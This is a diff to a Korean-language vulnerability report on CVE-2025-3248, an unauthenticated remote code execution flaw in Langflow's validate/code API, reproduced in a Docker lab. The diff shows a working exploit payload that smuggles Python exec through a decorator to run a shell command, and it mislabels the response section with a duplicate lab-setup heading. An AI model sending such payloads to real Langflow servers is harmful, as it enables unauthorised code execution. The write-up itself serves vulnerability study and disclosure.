@@ -1,6 +1,6 @@
 # CVE-2025-3248 Langflow `validate/code` API 인증 우회 원격 코드 실행 취약점 분석 보고서
 
-## 📌 개요
+## 개요
 
 본 보고서는 Langflow 1.2.0 버전 이하에서 발생하는 인증 우회 원격 코드 실행(Remote Code Execution, RCE) 취약점(CVE-2025-3248)에 대해 분석하고, Docker 환경에서 재현(PoC)한 결과를 문서화한 것입니다.
 
@@ -8,7 +8,7 @@
 
 ---
 
-## 🔍 취약점 정보
+## 취약점 정보
 
 | 항목 | 내용 |
 |------|------|
@@ -21,7 +21,7 @@
 
 ---
 
-## ⚙️ 실습 환경 구성
+## 실습 환경 구성
 
 ```bash
 git clone https://github.com/내아이디/vulhub.git
@@ -42,10 +42,11 @@ Content-Type: application/json
   "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']))\")\ndef foo():\n  pass"
 }
 
+```
 
-응답 결과
+## 실습 환경 구성
 
-
+```bash
 {
   "function": {
     "errors": [
